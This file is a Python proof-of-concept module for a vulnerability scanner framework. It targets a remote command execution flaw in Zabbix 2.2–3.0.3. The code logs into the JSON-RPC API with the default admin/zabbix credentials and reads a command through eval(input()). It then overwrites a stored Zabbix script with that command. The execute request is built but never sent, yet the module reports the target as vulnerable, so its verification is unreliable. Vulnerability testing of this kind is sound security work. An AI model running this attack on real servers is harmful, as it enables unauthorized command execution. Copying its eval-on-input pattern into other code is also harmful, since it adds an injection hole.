# coding:utf-8
import json
import readline

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zabbix_0101'  # 平台漏洞编号
    name = 'Zabbix RCE with API JSON-RPC'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    Zabbix RCE with API JSON-RPC.
    Zabbix versions 2.2 through 3.0.3 suffer from a remote command execution vulnerability in the JSON-RPC API.
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zabbix'  # 漏洞组件名称
    product_version = '2.2-3.0.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9644d96f-b74b-4cca-bec2-e0bed348f8a9'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + '/api_jsonrpc.php'
            login = 'admin'  # Zabbix login
            password = 'zabbix'  # Zabbix password
            hostid = '10084'  # Zabbix hostid
            payload = {
                "jsonrpc": "2.0",
                "method": "user.login",
                "params": {
                    'user': ""+login+"",
                    'password': ""+password+"",
                },
                "auth": None,
                "id": 0,
            }
            headers = {
                'content-type': 'application/json',
            }
            auth = requests.post(url, data=json.dumps(
                payload), headers=(headers))
            try:
                auth = auth.json()
            except:
                return
            cmd = eval(input('\033[41m[zabbix_cmd]>>: \033[0m '))

        # update
            payload = {
                "jsonrpc": "2.0",
                "method": "script.update",
                "params": {
                    "scriptid": "1",
                    "command": ""+cmd+""
                },
                "auth": auth['result'],
                "id": 0,
            }

            cmd_upd = requests.post(
                url, data=json.dumps(payload), headers=(headers))
        # execute
            payload = {
                "jsonrpc": "2.0",
                "method": "script.execute",
                "params": {
                    "scriptid": "1",
                    "hostid": ""+hostid+""
                },
                "auth": auth['result'],
                "id": 0,
            }
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
